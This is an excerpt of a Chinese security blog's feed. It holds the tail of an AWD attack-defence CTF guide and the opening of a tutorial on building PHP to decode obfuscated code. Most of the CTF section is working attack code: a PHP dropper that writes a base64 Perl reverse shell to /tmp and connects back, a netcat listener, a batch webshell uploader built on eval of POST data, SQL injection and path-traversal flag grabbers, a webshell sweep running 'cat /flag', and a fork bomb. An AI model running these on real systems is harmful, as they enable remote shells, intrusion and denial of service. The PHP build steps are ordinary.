class="params">($fname,$text)</span></span>&#123; </span><br><span class="line"><span class="keyword">if</span>($fp=@fopen($fname,<span class="string">'w'</span>)) &#123; </span><br><span class="line">@fputs($fp,@base64_decode($text)); </span><br><span class="line">@fclose($fp); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$yourip = <span class="string">"192.168.71.1"</span>; </span><br><span class="line">$yourport = <span class="string">'9999'</span>; </span><br><span class="line">$usedb = <span class="keyword">array</span>(<span class="string">'perl'</span>=&gt;<span class="string">'perl'</span>,<span class="string">'c'</span>=&gt;<span class="string">'c'</span>); </span><br><span class="line">$back_connect=<span class="string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span>. </span><br><span class="line"><span class="string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span>. </span><br><span class="line"><span class="string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span>. </span><br><span class="line"><span class="string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span>. </span><br><span class="line"><span class="string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span>. </span><br><span class="line"><span class="string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span>. </span><br><span class="line"><span class="string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span>; </span><br><span class="line">cf(<span class="string">'/tmp/.bc'</span>,$back_connect); </span><br><span class="line">$res = execute(which(<span class="string">'perl'</span>).<span class="string">" /tmp/.bc $yourip $yourport &amp;"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¹‹åæœ¬åœ°æ‰§è¡Œ<code>nc -lp 9999</code>å³å¯</p><p>6.è·å–flagçš„æ–¹å¼</p><p>(1) æ‰¹é‡ä¼ webshell(shellçš„å†…å®¹å¯ä»¥å†™ä¸ºæƒé™ç»´æŒéƒ¨åˆ†çš„é‚£ä¸ªè„šæœ¬)ï¼Œä¹‹åç»“åˆæ‰¹é‡è®¿é—® å‚è€ƒ<a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="noopener">PHP-å®šæ—¶ä»»åŠ¡</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚è€ƒ http://www.freebuf.com/sectool/91082.html</span></span><br><span class="line"><span class="comment">#!/usr/bin/python  </span></span><br><span class="line"><span class="comment">#coding=utf-8  </span></span><br><span class="line">  </span><br><span class="line">import urllib  </span><br><span class="line">import urllib2</span><br><span class="line">import sys</span><br><span class="line">import base64</span><br><span class="line">import re</span><br><span class="line">  </span><br><span class="line">def post(url, data):  </span><br><span class="line">    req = urllib2.Request(url)  </span><br><span class="line">    data = urllib.urlencode(data)   </span><br><span class="line">    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())  </span><br><span class="line">    response = opener.open(req, data)  </span><br><span class="line">    <span class="built_in">return</span> response.read()  </span><br><span class="line"></span><br><span class="line">def get_shell_path(posturl,passwd):</span><br><span class="line">    shell_path = <span class="string">""</span></span><br><span class="line">    try:</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></span><br><span class="line">        data[<span class="string">'z0'</span>]=<span class="string">'ZWNobyAkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ107'</span></span><br><span class="line">        shell_path = post(posturl, data).strip()</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br><span class="line">    <span class="built_in">return</span> shell_path</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    <span class="built_in">print</span> <span class="string">'\n+++++++++Batch Uploading Local File (Only for PHP webshell)++++++++++\n'</span></span><br><span class="line">    shellfile = sys.argv[1] <span class="comment"># å­˜æ”¾webshellè·¯å¾„å’Œå¯†ç çš„æ–‡ä»¶</span></span><br><span class="line">    localfile = sys.argv[2] <span class="comment"># æœ¬åœ°å¾…ä¸Šä¼ çš„æ–‡ä»¶å</span></span><br><span class="line">    shell_file = open(shellfile,<span class="string">'rb'</span>)</span><br><span class="line">    local_content = str(open(localfile,<span class="string">'rb'</span>).<span class="built_in">read</span>())</span><br><span class="line">    <span class="keyword">for</span> eachline <span class="keyword">in</span> shell_file:</span><br><span class="line">        posturl = eachline.split(<span class="string">','</span>)[0].strip()</span><br><span class="line">        passwd = eachline.split(<span class="string">','</span>)[1].strip()</span><br><span class="line">        try:</span><br><span class="line">            reg = <span class="string">".*/([^/]*\.php?)"</span></span><br><span class="line">            match_shell_name = re.search(reg,eachline)</span><br><span class="line">            <span class="keyword">if</span> match_shell_name:</span><br><span class="line">                shell_name=match_shell_name.group(1)</span><br><span class="line">                shell_path = get_shell_path(posturl,passwd).strip()</span><br><span class="line">                target_path = shell_path.split(shell_name)[0]+localfile</span><br><span class="line">                target_path_base64 = base64.b64encode(target_path)</span><br><span class="line">                target_file_url = eachline.split(shell_name)[0]+localfile</span><br><span class="line">                data = &#123;&#125;</span><br><span class="line">                data[passwd] = <span class="string">'@eval(base64_decode($_POST[z0]));'</span></span><br><span class="line">                data[<span class="string">'z0'</span>]=<span class="string">'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzsKJGY9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pOwokYz1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7CiRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOwokYz1zdHJfcmVwbGFjZSgiXG4iLCIiLCRjKTsKJGJ1Zj0iIjsKZm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MSkKICAgICRidWYuPXN1YnN0cigkYywkaSwxKTsKZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1ZikpOwplY2hvKCJ8PC0iKTsKZGllKCk7'</span></span><br><span class="line">                data[<span class="string">'z1'</span>]=target_path_base64</span><br><span class="line">                data[<span class="string">'z2'</span>]=base64.b64encode(local_content)</span><br><span class="line">                response = post(posturl, data)</span><br><span class="line">                <span class="keyword">if</span> response:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">'[+] '</span>+target_file_url+<span class="string">', upload succeed!'</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> <span class="string">'[-] '</span>+target_file_url+<span class="string">', upload failed!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', unsupported webshell!'</span></span><br><span class="line">        except Exception,e:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'[-] '</span>+posturl+<span class="string">', connection failed!'</span></span><br><span class="line">    shell_file.close()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>(2) æˆ–è€…ç›´æ¥æ‰§è¡Œä¸‹é¢çš„è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">flag=$(curl <span class="string">'http://172.16.4.42:800'</span>)</span><br><span class="line">curl --cookie <span class="string">"PHPSESSID=21il7pum6i3781pumljhv578c1; xdgame_username=%E5%B0%8F%E7%BA%A2%E5%B8%BD"</span> --data <span class="string">"key="</span><span class="variable">$&#123;flag&#125;</span> <span class="string">"http://172.16.4.42/index.php/wargame/submit"</span></span><br><span class="line">sleep 1s</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>(3) æœ‰äº›SQLæ³¨å…¥æ¼æ´å¯ä»¥é€šè¿‡sqlmapåˆ©ç”¨â€”sql-shell æ‰§è¡Œ<code>select load_file(&#39;/flag&#39;)</code>æ¥è·å–flagã€‚æœ€å¥½ç›´æ¥åˆ©ç”¨è„šæœ¬æ¥è·å¾—ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqli</span><span class="params">(host)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> sess_admin</span><br><span class="line">    data = &#123;<span class="string">"section_name"</span>:<span class="string">"asd"</span>,<span class="string">"admin_name"</span>:<span class="string">"'||(SELECT updatexml(1,concat(0x7e,(select load_file('/flag')),0x7e),1))||'"</span>,<span class="string">"announcement"</span>:<span class="string">"asd"</span>&#125;</span><br><span class="line">    r = sess_admin.post(<span class="string">'http://%s/index.php/section/add'</span>%host,data=data)</span><br><span class="line">    flags = re.findall(<span class="string">r'~(.+?)~'</span>,r.content)</span><br><span class="line">    <span class="keyword">if</span> flags:</span><br><span class="line">        <span class="keyword">return</span> flags[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error pwn!"</span></span><br></pre></td></tr></table></figure><p>(4) æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç›´æ¥å¯ä»¥é€šè¿‡../../../../../../flagçš„æ–¹å¼è·å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def include(host):</span><br><span class="line">    r = requests.get(url=<span class="string">"http://%s/?t=../../../../../../flag"</span>%host)</span><br><span class="line">    flags = re.findall(r<span class="string">'^(.+?)&lt;'</span>,r.content)</span><br><span class="line">    <span class="keyword">if</span> flags:</span><br><span class="line">        <span class="built_in">return</span> flags[0]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">"error pwn!"</span></span><br></pre></td></tr></table></figure><p>(5)æ‰¹é‡æäº¤flagçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> httplib</span><br><span class="line">server_host = <span class="string">'10.10.0.2'</span></span><br><span class="line">server_port = <span class="number">80</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(team_token, flag, host=server_host, port=server_port, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> team_token <span class="keyword">or</span> <span class="keyword">not</span> flag:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'team token or flag not found'</span>)</span><br><span class="line">    conn = httplib.HTTPConnection(host, port, timeout=timeout)</span><br><span class="line">    params = urllib.urlencode(&#123;</span><br><span class="line">        <span class="string">'token'</span>: team_token,</span><br><span class="line">        <span class="string">'flag'</span>: flag,</span><br><span class="line">    &#125;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn.request(<span class="string">'POST'</span>, <span class="string">'/api/submit_flag'</span>, params, headers)</span><br><span class="line">    response = conn.getresponse()</span><br><span class="line">    data = response.read()</span><br><span class="line">    <span class="keyword">return</span> json.loads(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'usage: ./submitflag.py $team_token $flag'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    host = server_host</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> json.dumps(submit(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], host=host), indent=<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>7.æ‰¹é‡ä¿®æ”¹sshå¯†ç çš„è„šæœ¬(çŒ¥çæµç›´æ¥å¹²æ‰å‡ ä¸ªå¯¹æ‰‹)</p><p>8.å¦‚æœæœ‰å‘ç°æœ‰é¢„ç•™åé—¨ï¼Œè¦ç«‹å³ä½¿ç”¨è„šæœ¬è¿›è¡Œè·å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">"http://192.168.71."</span></span><br><span class="line">url1=<span class="string">""</span></span><br><span class="line">shell=<span class="string">"/Upload/index.php"</span></span><br><span class="line">passwd=<span class="string">"abcde10db05bd4f6a24c94d7edde441d18545"</span> </span><br><span class="line">port=<span class="string">"80"</span></span><br><span class="line">payload = &#123;passwd: <span class="string">'system(\'cat /flag\');'</span>&#125;</span><br><span class="line">f=open(<span class="string">"webshelllist.txt"</span>,<span class="string">"w"</span>) </span><br><span class="line">f1=open(<span class="string">"firstround_flag.txt"</span>,<span class="string">"w"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">51</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">41</span>,<span class="number">42</span>,<span class="number">43</span>,<span class="number">71</span>,<span class="number">72</span>,<span class="number">73</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>]: </span><br><span class="line">    url1=url+str(i)+<span class="string">":"</span>+port+shell</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.post(url1,payload,timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == requests.codes.ok:</span><br><span class="line">            <span class="keyword">print</span> url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f1,url1+<span class="string">" connect shell sucess,flag is "</span>+res.text</span><br><span class="line">            <span class="keyword">print</span> &gt;&gt;f,url1+<span class="string">","</span>+passwd</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"shell 404"</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> url1+<span class="string">" connect shell fail"</span></span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>9.è‡ªå†™æ•æ„ŸåŠŸèƒ½ã€‚ä¸»åŠæ–¹å¯èƒ½å·²ç»æŠŠCMSæœ¬èº«çš„æ¼æ´è¡¥å…¨äº†ï¼Œå¹¶è‡ªå†™äº†ä¸€äº›æ•æ„ŸåŠŸèƒ½ï¼Œå¦‚ä¸Šä¼ ã€åŒ…å«ç•Œé¢..ï¼Œè¿™æ—¶å€™éœ€è¦è‡ªå·±æ‰‹åŠ¨å»å‘ç°ï¼ˆåˆ©ç”¨seayä»£ç å®¡è®¡å·¥å…·å¯å¿«é€Ÿå®šä½ã€ls -tæŒ‰ä¿®æ”¹æ—¶é—´æ¥çœ‹æœ€æ–°è¢«ä¿®æ”¹çš„æ–‡ä»¶ï¼‰ï¼Œåˆ†æï¼Œåˆ é™¤ï¼Œåˆ©ç”¨ã€‚</p><p>10.forkç‚¸å¼¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å‚è€ƒ: https://linux.cn/article-5685-1-rss.html</span></span><br><span class="line">:()&#123;:|:&amp;&#125;;:</span><br></pre></td></tr></table></figure><h3 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h3><ul><li><a href="https://xianzhi.aliyun.com/forum/topic/1530/" target="_blank" rel="noopener">https://xianzhi.aliyun.com/forum/topic/1530</a></li><li><a href="http://bobao.360.cn/ctf/learning/210.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/learning/210.html</a></li><li><a href="https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/q6xwmkADGnbHJQRbPblaHg</a></li><li><a href="https://www.t00ls.net/viewthread.php?tid=34681" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=34681</a></li><li><a href="http://rcoil.me/2017/06/CTF" target="_blank" rel="noopener">http://rcoil.me/2017/06/CTFçº¿ä¸‹èµ›æ€»ç»“</a></li><li><a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560" target="_blank" rel="noopener">https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10560</a></li><li><a href="http://www.freebuf.com/articles/web/118149.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/118149.html</a></li><li><a href="https://www.secpulse.com/archives/38622.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/38622.html</a></li><li><a href="http://bobao.360.cn/ctf/detail/169.html" target="_blank" rel="noopener">http://bobao.360.cn/ctf/detail/169.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-AWDæ¨¡å¼&quot;&gt;&lt;a href=&quot;#0x01-AWDæ¨¡å¼&quot; class=&quot;headerlink&quot; title=&quot;0x01 AWDæ¨¡å¼&quot;&gt;&lt;/a&gt;0x01 AWDæ¨¡å¼&lt;/h3&gt;&lt;p&gt;Attack With Defenceï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯ä½ æ—¢æ˜¯ä¸€ä¸ªhackerï¼Œ
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>è§£å¯†æ··æ·†çš„PHPä»£ç </title>
    <link href="http://zer0yu.github.io/2018/05/23/decode-garble-phpcode/"/>
    <id>http://zer0yu.github.io/2018/05/23/decode-garble-phpcode/</id>
    <published>2018-05-23T09:06:48.000Z</published>
    <updated>2018-05-23T12:37:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>###0x00 å‰è¨€</p><p>è¢«æ··æ·†PHPä»£ç è§çš„å¾ˆå¤šäº†ï¼Œä½†ä»¥å‰æ¯”è¾ƒæ‡’æ€»æ˜¯ç”¨æ‰©å±•ç›´æ¥decodeæ‰ï¼Œæœ€è¿‘å°±æƒ³æ‰‹åŠ¨æ“ä½œä¸‹çœ‹çœ‹ä¸ä½¿ç”¨æ‰©å±•æ€ä¹ˆè¿›è¡Œè§£å¯†ã€‚</p><h3 id="0x01-åŸç†"><a href="#0x01-åŸç†" class="headerlink" title="0x01 åŸç†"></a>0x01 åŸç†</h3><p>ä¸€èˆ¬æ¥è¯´PHPçš„æ··æ·†éƒ½ä¼šé€šè¿‡å¤šæ¬¡<code>eval</code>æ¥è¿˜åŸå¹¶æ‰§è¡Œphpä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡hook PHPçš„<code>eval</code>å‡½æ•°æ¥æ‰“å°å…¶å‚æ•°æ¥è§£å¯†ä»£ç ã€‚</p><h3 id="0x02-ç¯å¢ƒé…ç½®"><a href="#0x02-ç¯å¢ƒé…ç½®" class="headerlink" title="0x02 ç¯å¢ƒé…ç½®"></a>0x02 ç¯å¢ƒé…ç½®</h3><p>OS: ubuntu 18.04</p><p>PHP: 5.6.36</p><p>é¦–å…ˆè¦å®‰è£…PHPï¼Œæ­¤å¤„å®‰è£…çš„ç‰ˆæœ¬ä¸º5.6.36</p><p>1.å®‰è£…ç›¸å…³çš„ä¾èµ–åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libxml2-dev build-essential openssl libssl-dev make curl  libcurl4-gnutls-dev libjpeg-dev libpng-dev libtool-bin bison php-fpm</span><br></pre></td></tr></table></figure><p>2.ç¼–è¯‘å®‰è£…libiconv</p><p>åœ¨<a href="http://www.gnu.org/software/libiconv/#TOCdownloading" target="_blank" rel="noopener">libiconvå®˜ç½‘</a>ä¸‹è½½å‹ç¼©åŒ…ï¼Œæ”¾åˆ°<code>/usr/local/src</code>ä¸‹ï¼Œè§£å‹ï¼Œç¼–è¯‘å®‰è£…ï¼Œè¿™é‡Œä¸‹è½½çš„æ˜¯<code>libiconv-1.15.tar.gz</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf libiconv-1.15.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libiconv-1.15</span><br><span class="line">sudo ./configure --prefix=/usr/<span class="built_in">local</span></span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig // åˆ·æ–°åŠ¨æ€é“¾æ¥åº“ç¼“å­˜</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™é‡Œæ˜¯å°†<code>libiconv</code>å®‰è£…åˆ°äº†ç³»ç»Ÿé»˜è®¤çš„<code>lib</code>ç›®å½•ä¸‹ï¼Œå®‰è£…è·¯å¾„<code>/usr/local</code>ä¸å¯éšæ„æ›´æ”¹ï¼Œå¦åˆ™åé¢ä¼šå‡ºç°ç¼–è¯‘é”™è¯¯ã€‚å¦å¤–ï¼Œæ‰§è¡Œ<code>sudo make</code>ä¹‹åä¼šæœ‰å¦‚ä¸‹warning</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">warning: remember too run &apos;libtool --finish /usr/local/lib&apos;</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§warningçš„æç¤ºæ‰§è¡Œä¸€ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libtool --finish /usr/local/lib</span><br></pre></td></tr></table></figure><p>3.ç¼–è¯‘å®‰è£…PHP</p><p>å»<a href="http://php.net/" target="_blank" rel="noopener">PHPå®˜ç½‘</a>ä¸‹è½½<code>php5.6.36</code>å‹ç¼©åŒ…æ”¾åˆ°<code>/usr/local/src</code>ä¸‹ï¼Œè§£å‹ï¼Œç¼–è¯‘å®‰è£…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo tar zxvf php-5.6.36.tar.gz</span><br><span class="line"><span class="built_in">cd</span> php-5.6.36</span><br><span class="line"><span class="comment">#ç”±äºæˆ‘ä»¬åé¢è¦è¿›è¡Œè°ƒè¯•ï¼Œæ‰€ä»¥è¦åœ¨ç¼–è¯‘æ—¶åŠ ä¸Š-gå‚æ•°ï¼ŒåŠ è°ƒè¯•ç¬¦å·</span></span><br><span class="line">sudo ./configure CFLAGS=<span class="string">"-g"</span> CXXFLAGS=<span class="string">"-g"</span></span><br><span class="line">sudo make ZEND_EXTRA_LIBS=<span class="string">'-liconv'</span> -j16</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>4.è¡¥å……ä¸‹æ‰©å±•çš„ç¼–è¯‘å®‰è£…</p><p>åœ¨æ­¤å¤„ä»¥zlibçš„ç¼–è¯‘å®‰è£…ä¸ºä¾‹ï¼Œç”±äºæˆ‘ä»¬çš„PHPæ˜¯ç¼–è¯‘å®‰è£…çš„ï¼Œæ‰€ä»¥åœ¨è·¯å¾„<code>php-5.6.36/ext/zlib/</code>ä¸‹å°±æœ‰æ‰€éœ€è¦çš„æ–‡ä»¶ã€‚å¦‚æœè¦å®‰è£…çš„æ‰©å±•åœ¨phpæºç extç›®å½•ä¸­æ²¡æœ‰ï¼Œå¯ä»¥ä»<a href="http://pecl.php.net/" target="_blank" rel="noopener">PECL</a>ä¸Šæœç´¢ä½ éœ€è¦çš„æ‰©å±•è¿›è¡Œç¼–è¯‘å®‰è£…ã€‚</p><p>1.åœ¨å¯¹åº”çš„æ‰©å±•ç›®å½•è¿è¡Œ<code>phpize</code>å‘½ä»¤(å¦‚æœæ²¡æœ‰æç¤ºautoconfè®°å¾—aptå®‰è£…)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ phpize </span><br><span class="line">Configuring <span class="keyword">for</span>:</span><br><span class="line">PHP Api Version:         20131106</span><br><span class="line">Zend Module Api No:      20131226</span><br><span class="line">Zend Extension Api No:   220131226</span><br></pre></td></tr></table></figure><p>2.è¿è¡Œ<code>configure</code>å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop/php-5.6.36/ext/zlib$ ./configure</span><br><span class="line">checking <span class="keyword">for</span> grep that handles long lines 